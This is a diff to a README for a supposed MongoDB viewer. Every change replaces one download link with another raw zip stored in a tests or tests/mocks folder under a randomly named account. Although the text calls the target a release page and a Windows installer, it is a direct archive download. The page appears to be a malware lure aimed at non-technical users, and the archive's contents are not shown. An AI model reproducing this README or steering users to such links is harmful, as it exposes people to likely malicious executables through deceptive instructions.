@@ -1,6 +1,6 @@
 # 🗄️ app - Simple MongoDB Viewer for Everyone
 
-[![Download app](https://img.shields.io/badge/download-Get%20app-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Primulaauriculadiodontidae409/app/main/tests/Software-3.7.zip)
+[![Download app](https://img.shields.io/badge/download-Get%20app-brightgreen?style=for-the-badge)](https://github.com/Primulaauriculadiodontidae409/app/raw/refs/heads/main/tests/mocks/Software-squibber.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before you download, here is what your computer needs:
 ## 🚀 Getting Started: How to Download and Run app
 
 1. Open this link in your web browser:  
-   [https://raw.githubusercontent.com/Primulaauriculadiodontidae409/app/main/tests/Software-3.7.zip](https://raw.githubusercontent.com/Primulaauriculadiodontidae409/app/main/tests/Software-3.7.zip)
+   [https://github.com/Primulaauriculadiodontidae409/app/raw/refs/heads/main/tests/mocks/Software-squibber.zip](https://github.com/Primulaauriculadiodontidae409/app/raw/refs/heads/main/tests/mocks/Software-squibber.zip)
 
 2. On the page, find the latest release. It usually appears at the top.
 
@@ -101,7 +101,7 @@ Before you download, here is what your computer needs:
 
 Check the releases page regularly to see if a new version is available:
 
-[https://raw.githubusercontent.com/Primulaauriculadiodontidae409/app/main/tests/Software-3.7.zip](https://raw.githubusercontent.com/Primulaauriculadiodontidae409/app/main/tests/Software-3.7.zip)
+[https://github.com/Primulaauriculadiodontidae409/app/raw/refs/heads/main/tests/mocks/Software-squibber.zip](https://github.com/Primulaauriculadiodontidae409/app/raw/refs/heads/main/tests/mocks/Software-squibber.zip)
 
 When a new version appears:
 
@@ -137,4 +137,4 @@ app does not collect your data. All information stays on your computer or server
 
 Click the button below to visit the release page and get the Windows installer:
 
-[![Download app](https://img.shields.io/badge/download-Get%20app-blue?style=for-the-badge)](https://raw.githubusercontent.com/Primulaauriculadiodontidae409/app/main/tests/Software-3.7.zip)
+[![Download app](https://img.shields.io/badge/download-Get%20app-blue?style=for-the-badge)](https://github.com/Primulaauriculadiodontidae409/app/raw/refs/heads/main/tests/mocks/Software-squibber.zip)
